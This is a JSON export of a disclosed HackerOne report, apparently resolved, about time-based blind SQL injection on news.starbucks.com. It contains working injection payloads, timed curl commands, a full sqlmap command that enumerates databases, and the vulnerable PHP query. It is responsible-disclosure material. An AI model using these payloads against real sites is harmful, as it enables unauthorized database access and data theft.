{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-01-26T18:48:13.747Z", 
    "voters": [
        "delimitry", 
        "fritzo", 
        "r4s_team", 
        "gerben_javado", 
        "fillawful", 
        "hackerhero", 
        "meals", 
        "skansing", 
        "tk0", 
        "samux", 
        "and 16 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 198292, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-02-24T19:47:12.051Z", 
    "vulnerability_information": "Hi,\n\nI just found that the post parameter \"group_id\" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.\n\nPoC:\n```\nPOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\n```\n\nThis query will result in an execution of a SLEEP command, delaying the server response time:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\nuser\t0m0.000s\nsys\t\t0m0.063s\n```\n\nIf the custom IF statement evaluates to False, the response would be sensibly faster:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m0.860s\nuser\t0m0.000s\nsys\t\t0m0.031s\n```\n\nIn this way it was possible to detect the dbms version being 5:\n```\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m4.945s\n\ntime curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal\t0m1.005s\n```", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "User"
    }, 
    "title": "Time-based Blind SQLi on news.starbucks.com", 
    "is_member_of_team?": null, 
    "vote_count": 26, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 3457, 
            "content": "Full story here: http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/", 
            "content_html": "<p>Full story here: <a title=\"http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/\" href=\"/redirect?signature=212d403c579fefce9ffc0c43d89c1fe5877801c0&amp;url=http%3A%2F%2Ftimeofcheck.com%2Ftime-based-blind-sqli-on-news-starbucks-com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/</span><i class=\"icon-external-link\"></i></a></p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-02-25T18:48:13.794Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-01-14T06:20:13.013Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-14T06:20:13.013Z", 
            "actor": {
                "username": "rockyrobot", 
                "url": "/rockyrobot", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/112/256/802d02123d88fe979646bb796a9050e493a5f513_medium.png?1474253312"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @toctou thank you for the report. We are reviewing this internally and will follow with an update soon. \n\nThank you,\n@rockyrobot ", 
            "markdown_message": "<p>Hi <a href=\"/toctou\">@toctou</a> thank you for the report. We are reviewing this internally and will follow with an update soon. </p>\n\n<p>Thank you,<br>\n<a href=\"/rockyrobot\">@rockyrobot</a> </p>\n", 
            "type": "Activities::Comment", 
            "id": 1420076, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-23T19:50:47.970Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-23T19:50:47.970Z", 
            "actor": {
                "username": "verona", 
                "url": "/verona", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/077/022/5fe031986d53aafe62ee2a38aeaf6072abe89917_medium.jpg?1473812581"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hello @toctou,\n\nThanks for the report. I `could not reproduce` the time delay at my side as all the results were returned with negligible delay. Is there a way that you could inject more time lag (say 5 seconds) for observing noticeable time lag? I suspect that all the requests generated error message at the web server without even reaching the database.\n\nThanks,\n@verona ", 
            "markdown_message": "<p>Hello <a href=\"/toctou\">@toctou</a>,</p>\n\n<p>Thanks for the report. I <code>could not reproduce</code> the time delay at my side as all the results were returned with negligible delay. Is there a way that you could inject more time lag (say 5 seconds) for observing noticeable time lag? I suspect that all the requests generated error message at the web server without even reaching the database.</p>\n\n<p>Thanks,<br>\n<a href=\"/verona\">@verona</a> </p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1439166, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-23T21:57:55.232Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-23T21:57:55.232Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @verona, thanks for your reply.\n\nI've investigated a bit and it seems that the function endpoint being exposed is now for some reason moved from \"ACT=55\" to \"ACT=158\", so your PoC is now the following:\n```\nPOST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\n```\n\nAs a further proof, with this vulnerabilityI've managed to extract the database names with sqlmap:\n```\nsqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:\n---\nParameter: group_id (POST)\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: ACT=55&jsontree={x: 1}&site_id=1&group_id=1' AND SLEEP(5) AND 'zxkh'='zxkh\n---\nweb application technology: Apache, PHP 5.5.31\nback-end DBMS: MySQL >= 5.0.0\navailable databases [5]:\n[*] cms\n[*] infq\n[*] mysql\n[*] performance_schema\n[*] test\n```\nthe problem seems to be reside in the core module file of the component NDG Flexible Admin for your ExpressionEngine implementation: in particular at the function `ajax_save_tree()`:\n```\n$results = $this->EE->db->query(\"SELECT group_id FROM \".$this->EE->db->dbprefix('ndg_flexible_admin_menus').\" WHERE group_id = '\".$group_id.\"'\");\n```\nwhere the parameter `$group_id` is not being sanitized before being inserted into the query, so being exposed to this kind of vulnerability.\n\n&nbsp;\nLet me know if you need some more information,\nthanks for your time,\n@toctou", 
            "markdown_message": "<p>Hi <a href=\"/verona\">@verona</a>, thanks for your reply.</p>\n\n<p>I&#39;ve investigated a bit and it seems that the function endpoint being exposed is now for some reason moved from &quot;ACT=55&quot; to &quot;ACT=158&quot;, so your PoC is now the following:</p>\n<pre class=\"highlight plaintext\"><code>POST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=1,SLEEP(1),0) AND group_id=&#39;1\n</code></pre>\n<p>As a further proof, with this vulnerabilityI&#39;ve managed to extract the database names with sqlmap:</p>\n<pre class=\"highlight plaintext\"><code>sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:\n---\nParameter: group_id (POST)\n    Type: AND/OR time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind\n    Payload: ACT=55&amp;jsontree={x: 1}&amp;site_id=1&amp;group_id=1&#39; AND SLEEP(5) AND &#39;zxkh&#39;=&#39;zxkh\n---\nweb application technology: Apache, PHP 5.5.31\nback-end DBMS: MySQL &gt;= 5.0.0\navailable databases [5]:\n[*] cms\n[*] infq\n[*] mysql\n[*] performance_schema\n[*] test\n</code></pre>\n<p>the problem seems to be reside in the core module file of the component NDG Flexible Admin for your ExpressionEngine implementation: in particular at the function <code>ajax_save_tree()</code>:</p>\n<pre class=\"highlight plaintext\"><code>$results = $this-&gt;EE-&gt;db-&gt;query(&quot;SELECT group_id FROM &quot;.$this-&gt;EE-&gt;db-&gt;dbprefix(&#39;ndg_flexible_admin_menus&#39;).&quot; WHERE group_id = &#39;&quot;.$group_id.&quot;&#39;&quot;);\n</code></pre>\n<p>where the parameter <code>$group_id</code> is not being sanitized before being inserted into the query, so being exposed to this kind of vulnerability.</p>\n\n<p>\u00a0<br>\nLet me know if you need some more information,<br>\nthanks for your time,<br>\n<a href=\"/toctou\">@toctou</a></p>\n", 
            "type": "Activities::BugNew", 
            "id": 1439515, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-24T01:26:34.679Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-24T01:26:34.679Z", 
            "actor": {
                "username": "verona", 
                "url": "/verona", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/077/022/5fe031986d53aafe62ee2a38aeaf6072abe89917_medium.jpg?1473812581"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "@toctou, Thanks for the quick response. Please clarify on below for validating the finding.\n\n1. For the first POST request, I could not noticed delay of 5 seconds when I changed from sleep(1) to sleep(5). Is there a better way to measure time delay?\n\n2. Please share the sqlmap command that revealed the database names.\n\n3. Can you provide more details on file / line number for the ajax_save_tree() function?\n\nThanks,\n@verona ", 
            "markdown_message": "<p><a href=\"/toctou\">@toctou</a>, Thanks for the quick response. Please clarify on below for validating the finding.</p>\n\n<ol>\n<li><p>For the first POST request, I could not noticed delay of 5 seconds when I changed from sleep(1) to sleep(5). Is there a better way to measure time delay?</p></li>\n<li><p>Please share the sqlmap command that revealed the database names.</p></li>\n<li><p>Can you provide more details on file / line number for the ajax_save_tree() function?</p></li>\n</ol>\n\n<p>Thanks,<br>\n<a href=\"/verona\">@verona</a> </p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1439999, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-24T14:11:49.887Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-24T14:11:49.887Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @verona, I'll reply item by item:\n\n1) When testing the PoC please check that the query is not malformed and the response from the server is `HTTP 200` and not `HTTP 500`, in the latter case it means that the dbms raised an error and it may be occur some time to re-enable accepting queries thus the measurement is not valid.\n\n1b) To correctly check the validity of the SQLi PoC I suggest to fiddle with the IF() condition being executed, thus distinghishing between the execution of the sleep command or not, rather than varying the seconds to sleep. Referring to the first PoC I submitted at the beginning of this report I think that testing with the following commands  in order would be appropriate:\n\n```\ntime curl --data \"ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal \t0m5.079s\n```\n\n```\ntime curl --data \"ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n\nreal \t0m0.880s\n```\n\n&nbsp;\n2) The sqlmap command I used was `sqlmap.py -u \"https://news.starbucks.com\" --data=\"ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1\" -p \"group_id\" --dbms=\"mysql\" --technique=T --dbs`\n\n&nbsp;\n3) I don't have visibility on your codebase but you could be locate the row I referenced at `/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php` at row 150 as per this other implementation you could find online: https://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\n\n&nbsp;\nLet me know if I satisfied your requests,\nthanks for your time,\n@toctou", 
            "markdown_message": "<p>Hi <a href=\"/verona\">@verona</a>, I&#39;ll reply item by item:</p>\n\n<p>1) When testing the PoC please check that the query is not malformed and the response from the server is <code>HTTP 200</code> and not <code>HTTP 500</code>, in the latter case it means that the dbms raised an error and it may be occur some time to re-enable accepting queries thus the measurement is not valid.</p>\n\n<p>1b) To correctly check the validity of the SQLi PoC I suggest to fiddle with the IF() condition being executed, thus distinghishing between the execution of the sleep command or not, rather than varying the seconds to sleep. Referring to the first PoC I submitted at the beginning of this report I think that testing with the following commands  in order would be appropriate:</p>\n<pre class=\"highlight plaintext\"><code>time curl --data &quot;ACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=1,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m5.079s\n</code></pre><pre class=\"highlight plaintext\"><code>time curl --data &quot;ACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=2,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m0.880s\n</code></pre>\n<p>\u00a0<br>\n2) The sqlmap command I used was <code>sqlmap.py -u &quot;https://news.starbucks.com&quot; --data=&quot;ACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&quot; -p &quot;group_id&quot; --dbms=&quot;mysql&quot; --technique=T --dbs</code></p>\n\n<p>\u00a0<br>\n3) I don&#39;t have visibility on your codebase but you could be locate the row I referenced at <code>/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php</code> at row 150 as per this other implementation you could find online: <a title=\"https://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php\" href=\"/redirect?signature=2c487422835ae8f47cf8b0b61b5aa9cdbc27346a&amp;url=https%3A%2F%2Fsearchcode.com%2Ffile%2F112391835%2Fhtml%2FAppCode%2Fexpressionengine%2Fthird_party%2Fndg_flexible_admin%2Fmod.ndg_flexible_admin.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://searchcode.com/file/112391835/html/AppCode/expressionengine/third_party/ndg_flexible_admin/mod.ndg_flexible_admin.php</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>\u00a0<br>\nLet me know if I satisfied your requests,<br>\nthanks for your time,<br>\n<a href=\"/toctou\">@toctou</a></p>\n", 
            "type": "Activities::BugNew", 
            "id": 1440929, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-24T21:52:54.267Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-24T21:55:07.303Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Update: while trying to do some more testing, it seems (pure speculation here) that sqlmap triggers some sort of WAF that relocates the \"ACT\" functions mapping, so it appears that \"ACT=158\" is no more a valid parameter to use in an attack once again.\n\nMaybe are you working on a fix?\nFor now I cannot find any valid \"ACT\" parameter value which brings to the vulnerable php function, so all previous PoCs are of no use. I'll keep you updated in case I'll find one, in the meantime let me know if the informations I've provided are enough.", 
            "markdown_message": "<p>Update: while trying to do some more testing, it seems (pure speculation here) that sqlmap triggers some sort of WAF that relocates the &quot;ACT&quot; functions mapping, so it appears that &quot;ACT=158&quot; is no more a valid parameter to use in an attack once again.</p>\n\n<p>Maybe are you working on a fix?<br>\nFor now I cannot find any valid &quot;ACT&quot; parameter value which brings to the vulnerable php function, so all previous PoCs are of no use. I&#39;ll keep you updated in case I&#39;ll find one, in the meantime let me know if the informations I&#39;ve provided are enough.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1442011, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-24T22:00:08.003Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-24T22:00:08.003Z", 
            "actor": {
                "username": "verona", 
                "url": "/verona", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/077/022/5fe031986d53aafe62ee2a38aeaf6072abe89917_medium.jpg?1473812581"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "@toctou, Thank you for the clarification.\n\n1. I still did not see much difference in execution times of queries. Can you explain what - operator before IF? Is it for subtraction?\n\n`time curl --data \"ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com`\n\n`real    0m0.516s`\n\n`time curl --data \"ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com`\n\n`real    0m0.498s`\n\n2. I am notifying the risk to news.starbuckscom team based on the identified databases by the sqlmap command.\n\nPlease note that we won't be able to offer bounty on this one as this site is not listed in our `Targets Eligible For Reward`. However, you could gain reputation points on H1 after the team resolves it.\n\nThanks,\n@verona \n\n\n", 
            "markdown_message": "<p><a href=\"/toctou\">@toctou</a>, Thank you for the clarification.</p>\n\n<ol>\n<li>I still did not see much difference in execution times of queries. Can you explain what - operator before IF? Is it for subtraction?</li>\n</ol>\n\n<p><code>time curl --data &quot;ACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=1,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com</code></p>\n\n<p><code>real    0m0.516s</code></p>\n\n<p><code>time curl --data &quot;ACT=158&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=2,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com</code></p>\n\n<p><code>real    0m0.498s</code></p>\n\n<ol>\n<li>I am notifying the risk to news.starbuckscom team based on the identified databases by the sqlmap command.</li>\n</ol>\n\n<p>Please note that we won&#39;t be able to offer bounty on this one as this site is not listed in our <code>Targets Eligible For Reward</code>. However, you could gain reputation points on H1 after the team resolves it.</p>\n\n<p>Thanks,<br>\n<a href=\"/verona\">@verona</a> </p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1442021, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-24T22:24:29.056Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-24T22:24:29.056Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi, @verona, thanks for the quick reply.\n\nAs I just said, any PoC is now unavailable as the URL with \"ACT=158\" is no more valid. Before my last message of some minutes ago you could have experienced 4/5 seconds of difference.\n\nFor the query, I just made up a quick test (I could have done better), and what you see is indeed a minus.\nIt have some abuse of notation, but it executes correctly: the SLEEP function always return value '0', so in the first case (`1=1`=`True`) it is equivalent of `group_id=1-0` with a delay of `1 second` as side effect (or more, it depends on how it all executes \"under the hood\"); \nin the second case (`1=2`=`False`) it is equivalent of `group_id=1-0` without any delay.\n\nLastly, I've informedly submitted this report knowing that it is out of scope, I just wanted to close an important bug for the sake of it (and gain some useful reputation of course!).\n\nThanks for reporting to the team, looking forward to see a reply.\n@toctou", 
            "markdown_message": "<p>Hi, <a href=\"/verona\">@verona</a>, thanks for the quick reply.</p>\n\n<p>As I just said, any PoC is now unavailable as the URL with &quot;ACT=158&quot; is no more valid. Before my last message of some minutes ago you could have experienced 4/5 seconds of difference.</p>\n\n<p>For the query, I just made up a quick test (I could have done better), and what you see is indeed a minus.<br>\nIt have some abuse of notation, but it executes correctly: the SLEEP function always return value &#39;0&#39;, so in the first case (<code>1=1</code>=<code>True</code>) it is equivalent of <code>group_id=1-0</code> with a delay of <code>1 second</code> as side effect (or more, it depends on how it all executes &quot;under the hood&quot;); <br>\nin the second case (<code>1=2</code>=<code>False</code>) it is equivalent of <code>group_id=1-0</code> without any delay.</p>\n\n<p>Lastly, I&#39;ve informedly submitted this report knowing that it is out of scope, I just wanted to close an important bug for the sake of it (and gain some useful reputation of course!).</p>\n\n<p>Thanks for reporting to the team, looking forward to see a reply.<br>\n<a href=\"/toctou\">@toctou</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 1442064, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-25T19:22:16.156Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-25T19:22:16.156Z", 
            "actor": {
                "username": "verona", 
                "url": "/verona", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/077/022/5fe031986d53aafe62ee2a38aeaf6072abe89917_medium.jpg?1473812581"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "@toctou, news.starbucks.com mentioned that this risk is fixed as they added some validations. Can you please validate?", 
            "markdown_message": "<p><a href=\"/toctou\">@toctou</a>, news.starbucks.com mentioned that this risk is fixed as they added some validations. Can you please validate?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1443921, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-25T21:43:06.762Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-25T21:43:06.762Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @verona,\n\nas far as I can test, I confirm that the vulnerability is no more exploitable. Thank you.", 
            "markdown_message": "<p>Hi <a href=\"/verona\">@verona</a>,</p>\n\n<p>as far as I can test, I confirm that the vulnerability is no more exploitable. Thank you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1444243, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-26T01:37:27.738Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-26T01:37:27.738Z", 
            "actor": {
                "url": "/starbucks", 
                "profile": {
                    "name": "Starbucks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
                }
            }, 
            "team_handle": "starbucks", 
            "message": "Verified as fixed by @toctou", 
            "markdown_message": "<p>Verified as fixed by <a href=\"/toctou\">@toctou</a></p>\n", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 1444568, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "toctou", 
                "url": "/toctou"
            }, 
            "created_at": "2017-01-26T01:37:51.068Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-26T01:37:51.068Z", 
            "actor": {
                "username": "verona", 
                "url": "/verona", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/077/022/5fe031986d53aafe62ee2a38aeaf6072abe89917_medium.jpg?1473812581"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1444569, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-26T18:48:13.765Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-26T18:48:13.765Z", 
            "actor": {
                "username": "toctou", 
                "url": "/toctou", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/279/6e3f768975b821a5a059664aec3d5dd2b9268890_medium.jpg?1462464508"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1446744, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-24T19:47:12.073Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-24T19:47:12.073Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1504306, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-24T19:47:12.116Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-24T19:47:12.116Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1504307, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "toctou", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/toctou", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/279/90baa26d3f63cbc0f6c1c0b42bed67f01103d582_small.jpg?1462464508"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 67, 
        "name": "SQL Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -56087690.849471696, 
    "disclosed_at": "2017-02-24T19:47:12.100Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/198292", 
    "created_at": "2017-01-14T04:52:15.129Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>I just found that the post parameter &quot;group_id&quot; for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.</p>\n\n<p>PoC:</p>\n<pre class=\"highlight plaintext\"><code>POST / HTTP/1.1\nHost: news.starbucks.com\nConnection: close\nContent-Length: 81\nCache-Control: max-age=0\nOrigin: https://news.starbucks.com\nContent-Type: application/x-www-form-urlencoded\n\nACT=55&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=1,SLEEP(1),0) AND group_id=&#39;1\n</code></pre>\n<p>This query will result in an execution of a SLEEP command, delaying the server response time:</p>\n<pre class=\"highlight plaintext\"><code>time curl --data &quot;ACT=55&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=1,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m4.945s\nuser    0m0.000s\nsys     0m0.063s\n</code></pre>\n<p>If the custom IF statement evaluates to False, the response would be sensibly faster:</p>\n<pre class=\"highlight plaintext\"><code>time curl --data &quot;ACT=55&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(1=2,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m0.860s\nuser    0m0.000s\nsys     0m0.031s\n</code></pre>\n<p>In this way it was possible to detect the dbms 